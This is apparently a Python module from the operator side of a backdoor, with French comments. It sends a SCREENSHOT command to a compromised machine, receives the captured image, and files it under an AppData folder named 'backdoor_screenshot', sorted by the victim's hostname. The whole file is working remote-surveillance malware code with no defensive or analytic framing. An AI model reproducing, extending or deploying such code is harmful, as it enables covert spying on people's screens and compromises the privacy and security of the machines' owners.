import struct
import os

class ScreenshotHandler:
    def __init__(self, conn_manager):
        self.conn_manager = conn_manager

    def capture(self):
        if not self.conn_manager.conn:
            return "[!] Pas de connexion établie."

        try:
            self.conn_manager.conn.send(b"SCREENSHOT")

            data = self.conn_manager.conn.recv(4)
            if len(data) < 4:
                return "[!] Erreur: Taille du fichier non reçue."

            file_size = struct.unpack("!I", data)[0]
            filename = self.conn_manager.conn.recv(100).decode().strip()
            
            # Extraire le nom du PC à partir du nom du fichier
            # Format du nom de fichier: ip_hostname_timestamp.png
            parts = filename.split('_')
            if len(parts) >= 2:
                pc_name = parts[1]  # Le hostname est la deuxième partie
            else:
                pc_name = "unknown"
            
            # Créer les dossiers dans AppData/Roaming
            appdata_path = os.path.join(os.getenv('APPDATA'), "backdoor_screenshot")
            if not os.path.exists(appdata_path):
                os.makedirs(appdata_path)
                
            pc_folder = os.path.join(appdata_path, pc_name)
            if not os.path.exists(pc_folder):
                os.makedirs(pc_folder)
                
            save_path = os.path.join(pc_folder, filename)

            received_bytes = 0
            with open(save_path, "wb") as file:
                while received_bytes < file_size:
                    chunk = self.conn_manager.conn.recv(min(4096, file_size - received_bytes))
                    if not chunk:
                        break
                    file.write(chunk)
                    received_bytes += len(chunk)

            return f"[+] Screenshot enregistré dans: {save_path}" if received_bytes == file_size else "[!] Erreur: Fichier incomplet reçu."
        except Exception as e:
            return f"[!] Erreur lors de la réception: {str(e)}"